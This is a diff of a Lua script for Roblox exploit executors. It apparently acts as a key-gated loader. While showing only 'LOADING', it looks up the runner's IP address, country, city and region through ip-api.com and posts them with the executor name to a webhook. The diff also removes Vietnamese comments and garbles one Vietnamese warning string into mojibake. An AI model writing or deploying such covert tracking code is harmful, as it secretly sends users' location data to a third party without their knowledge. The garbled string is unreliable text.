@@ -30,13 +30,12 @@ if not found then
     game.Players.LocalPlayer:Kick("please enter your key")
 end
 
-local requestt = http_request or request or syn and syn.request
+local requestt = http_request or request or (syn and syn.request)
 if not requestt then
     warn("Request function not available")
     return
 end
 
--- Lấy IP, Location
 local ip, country, city, region = "Unknown", "Unknown", "Unknown", "Unknown"
 local success, response = pcall(function()
     return requestt({Url = "http://ip-api.com/json", Method = "GET"})
@@ -49,13 +48,9 @@ if success and response and response.Body then
     region = decoded.regionName or region
 end
 
--- Các thông tin khác (placeholder)
 local mac, serial, device_name, os_version = "Unknown", "Unknown", "Unknown", "Unknown"
-
--- Thông tin executor
 local executor = identifyexecutor and (identifyexecutor() or getexecutorname()) or "Unknown"
 
--- Gửi Webhook
 local data = {
     ["embeds"] = {
         {
@@ -98,6 +93,5 @@ end)
 if webhookSuccess then
     print("LOADING")
 else
-    warn("Gửi webhook thất bại:", result)
+    warn("Gá»­i webhook tháº¥t báº¡i:", result)
 end
-
